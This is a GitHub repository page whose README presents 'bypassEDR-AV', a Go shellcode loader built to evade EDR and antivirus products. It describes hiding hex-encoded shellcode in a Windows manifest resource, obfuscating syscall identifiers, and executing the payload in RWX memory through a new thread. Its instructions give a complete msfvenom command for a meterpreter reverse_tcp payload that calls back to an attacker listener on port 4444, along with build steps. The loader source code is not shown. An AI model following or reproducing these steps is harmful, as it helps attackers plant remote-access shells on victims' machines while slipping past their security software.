# https://github.com/ASP4RUX/bypassEDR-AV

[Skip to content](https://github.com/ASP4RUX/bypassEDR-AV#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/ASP4RUX/bypassEDR-AV) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/ASP4RUX/bypassEDR-AV) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/ASP4RUX/bypassEDR-AV) to refresh your session.Dismiss alert

{{ message }}

[ASP4RUX](https://github.com/ASP4RUX)/ **[bypassEDR-AV](https://github.com/ASP4RUX/bypassEDR-AV)** Public

- [Notifications](https://github.com/login?return_to=%2FASP4RUX%2FbypassEDR-AV) You must be signed in to change notification settings
- [Fork\\
10](https://github.com/login?return_to=%2FASP4RUX%2FbypassEDR-AV)
- [Star\\
59](https://github.com/login?return_to=%2FASP4RUX%2FbypassEDR-AV)


[59\\
stars](https://github.com/ASP4RUX/bypassEDR-AV/stargazers) [10\\
forks](https://github.com/ASP4RUX/bypassEDR-AV/forks) [Branches](https://github.com/ASP4RUX/bypassEDR-AV/branches) [Tags](https://github.com/ASP4RUX/bypassEDR-AV/tags) [Activity](https://github.com/ASP4RUX/bypassEDR-AV/activity)

[Star](https://github.com/login?return_to=%2FASP4RUX%2FbypassEDR-AV)

[Notifications](https://github.com/login?return_to=%2FASP4RUX%2FbypassEDR-AV) You must be signed in to change notification settings

# ASP4RUX/bypassEDR-AV

main

[**1** Branch](https://github.com/ASP4RUX/bypassEDR-AV/branches) [**0** Tags](https://github.com/ASP4RUX/bypassEDR-AV/tags)

[Go to Branches page](https://github.com/ASP4RUX/bypassEDR-AV/branches)[Go to Tags page](https://github.com/ASP4RUX/bypassEDR-AV/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![ASP4RUX](https://avatars.githubusercontent.com/u/136134812?v=4&size=40)](https://github.com/ASP4RUX)[ASP4RUX](https://github.com/ASP4RUX/bypassEDR-AV/commits?author=ASP4RUX)<br>[Update README.md](https://github.com/ASP4RUX/bypassEDR-AV/commit/c004778290f3b8803a32abeb7a109382a0bf90f3)<br>2 years agoNov 13, 2024<br>[c004778](https://github.com/ASP4RUX/bypassEDR-AV/commit/c004778290f3b8803a32abeb7a109382a0bf90f3) · 2 years agoNov 13, 2024<br>## History<br>[7 Commits](https://github.com/ASP4RUX/bypassEDR-AV/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/ASP4RUX/bypassEDR-AV/commits/main/) 7 Commits |
| [README.md](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/README.md "README.md") | [README.md](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/README.md "README.md") | [Update README.md](https://github.com/ASP4RUX/bypassEDR-AV/commit/c004778290f3b8803a32abeb7a109382a0bf90f3 "Update README.md") | 2 years agoNov 13, 2024 |
| [go.mod](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/go.mod "go.mod") | [go.mod](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/go.mod "go.mod") | [Add files via upload](https://github.com/ASP4RUX/bypassEDR-AV/commit/704e90ffd33d5c06b8bf7a8a51425f3a37439c54 "Add files via upload") | 2 years agoNov 13, 2024 |
| [go.sum](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/go.sum "go.sum") | [go.sum](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/go.sum "go.sum") | [Add files via upload](https://github.com/ASP4RUX/bypassEDR-AV/commit/704e90ffd33d5c06b8bf7a8a51425f3a37439c54 "Add files via upload") | 2 years agoNov 13, 2024 |
| [hash.txt](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/hash.txt "hash.txt") | [hash.txt](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/hash.txt "hash.txt") | [Add files via upload](https://github.com/ASP4RUX/bypassEDR-AV/commit/704e90ffd33d5c06b8bf7a8a51425f3a37439c54 "Add files via upload") | 2 years agoNov 13, 2024 |
| [manifiesto.txt](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/manifiesto.txt "manifiesto.txt") | [manifiesto.txt](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/manifiesto.txt "manifiesto.txt") | [Add files via upload](https://github.com/ASP4RUX/bypassEDR-AV/commit/704e90ffd33d5c06b8bf7a8a51425f3a37439c54 "Add files via upload") | 2 years agoNov 13, 2024 |
| [rsrc\_windows\_amd64.syso](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/rsrc_windows_amd64.syso "rsrc_windows_amd64.syso") | [rsrc\_windows\_amd64.syso](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/rsrc_windows_amd64.syso "rsrc_windows_amd64.syso") | [Add files via upload](https://github.com/ASP4RUX/bypassEDR-AV/commit/704e90ffd33d5c06b8bf7a8a51425f3a37439c54 "Add files via upload") | 2 years agoNov 13, 2024 |
| [stub.txt](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/stub.txt "stub.txt") | [stub.txt](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/stub.txt "stub.txt") | [Add files via upload](https://github.com/ASP4RUX/bypassEDR-AV/commit/704e90ffd33d5c06b8bf7a8a51425f3a37439c54 "Add files via upload") | 2 years agoNov 13, 2024 |
| [syscall.go](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/syscall.go "syscall.go") | [syscall.go](https://github.com/ASP4RUX/bypassEDR-AV/blob/main/syscall.go "syscall.go") | [Add files via upload](https://github.com/ASP4RUX/bypassEDR-AV/commit/704e90ffd33d5c06b8bf7a8a51425f3a37439c54 "Add files via upload") | 2 years agoNov 13, 2024 |
| View all files |

## Repository files navigation

# Bypass EDR / AV

[Permalink: Bypass EDR / AV](https://github.com/ASP4RUX/bypassEDR-AV#bypass-edr--av)

## Summary

[Permalink: Summary](https://github.com/ASP4RUX/bypassEDR-AV#summary)

This code loads shellcode embedded within the application’s resources, decodes it, and executes it directly in memory by leveraging Windows API calls. Functions and variables are configured to handle memory structures and permissions, enabling it to create a thread and execute the shellcode.

## Techniques Used

[Permalink: Techniques Used](https://github.com/ASP4RUX/bypassEDR-AV#techniques-used)

1- Loading and Extracting Resources: It uses FindResourceW and LoadResource functions to locate and load resources embedded within the binary. The function ReturnShellcode() leverages MAKEINTRESOURCE to access a type 24 resource (specific to Windows) and extract the shellcode contained between delimiters (#! and $!).

2- Shellcode Decoding: Once the resource is extracted, the shellcode is decoded from hexadecimal into bytes for execution.

3- Hash Obfuscation: The hash function applies obfuscation by XOR-ing strings with a specific key (0xde, 0xad, 0xbe, 0xef). It then calculates an SHA-1 hash, and the first 16 characters of the result serve as a system call identifier (syscall ID).

4- Memory Allocation and Permission Configuration: The code utilizes Windows API calls to allocate executable memory (with read, write, and execute permissions) for the shellcode (MEM\_COMMIT, MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE) and The NtAllocateVirtualMemory method reserves a block of memory with executable permissions for storing the shellcode.

5- Writing and Executing Shellcode in Memory: NtWriteVirtualMemory is used to copy the shellcode into the allocated memory region and A new thread is created with NtCreateThreadEx, pointing to the memory block containing the shellcode.

6- Execution Wait: NtWaitForSingleObject is used to wait indefinitely for the shellcode to execute in the new thread.

We will use a technique of exploiting the manifest files using the RSRC tool.
What is a manifest file? --> It is an XML file that provides information. We will take advantage of this file to leave our shellcode.

## Instructions

[Permalink: Instructions](https://github.com/ASP4RUX/bypassEDR-AV#instructions)

Create shellcode --> msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=eth0 lport=4444 EnableStageEncoding=true StageEncoder=x64/xor\_dynamic EXITFUNC=thread -f hex

Install 2 libraries : go get "golang.org/x/sys/windows" and go get "github.com/ASP4RUX/Hades/pkg/Hades"

Install RSRC --> go install github.com/akavel/rsrc@latest

Modify manifest.txt file using hex-encoded shellcode inside the characters (#!) and ($!).

RSRC --> rsrc -manifest manifiesto.txt

Compile --> go build -ldflags="-H=windowsgui -s -w"

[![imagen](https://private-user-images.githubusercontent.com/136134812/385818694-467a3913-0a1a-4022-b40f-a1d0fccc62bf.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI2NDAsIm5iZiI6MTc3MTQxMjM0MCwicGF0aCI6Ii8xMzYxMzQ4MTIvMzg1ODE4Njk0LTQ2N2EzOTEzLTBhMWEtNDAyMi1iNDBmLWExZDBmY2NjNjJiZi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMDU5MDBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05NGMxN2U3NWVjMzQwYzhmZTgxZGY1MjBlNzk5NGM2ZTVjMDAwYjM2ZmIyZWI3OTY1N2M4ZDg5YWNlZDZjZDI4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.ukPt2fIv2dhDrJdsRIcQsyVSBcbpEClqMgSx6wfZ6Rs)](https://private-user-images.githubusercontent.com/136134812/385818694-467a3913-0a1a-4022-b40f-a1d0fccc62bf.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI2NDAsIm5iZiI6MTc3MTQxMjM0MCwicGF0aCI6Ii8xMzYxMzQ4MTIvMzg1ODE4Njk0LTQ2N2EzOTEzLTBhMWEtNDAyMi1iNDBmLWExZDBmY2NjNjJiZi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMDU5MDBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05NGMxN2U3NWVjMzQwYzhmZTgxZGY1MjBlNzk5NGM2ZTVjMDAwYjM2ZmIyZWI3OTY1N2M4ZDg5YWNlZDZjZDI4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.ukPt2fIv2dhDrJdsRIcQsyVSBcbpEClqMgSx6wfZ6Rs)

## About

No description, website, or topics provided.


### Resources

[Readme](https://github.com/ASP4RUX/bypassEDR-AV#readme-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/ASP4RUX/bypassEDR-AV).

[Activity](https://github.com/ASP4RUX/bypassEDR-AV/activity)

### Stars

[**59**\\
stars](https://github.com/ASP4RUX/bypassEDR-AV/stargazers)

### Watchers

[**1**\\
watching](https://github.com/ASP4RUX/bypassEDR-AV/watchers)

### Forks

[**10**\\
forks](https://github.com/ASP4RUX/bypassEDR-AV/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FASP4RUX%2FbypassEDR-AV&report=ASP4RUX+%28user%29)

## [Releases](https://github.com/ASP4RUX/bypassEDR-AV/releases)

No releases published

## [Packages\  0](https://github.com/users/ASP4RUX/packages?repo_name=bypassEDR-AV)

No packages published

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/ASP4RUX/bypassEDR-AV).

## Languages

- [Go100.0%](https://github.com/ASP4RUX/bypassEDR-AV/search?l=go)

You can’t perform that action at this time.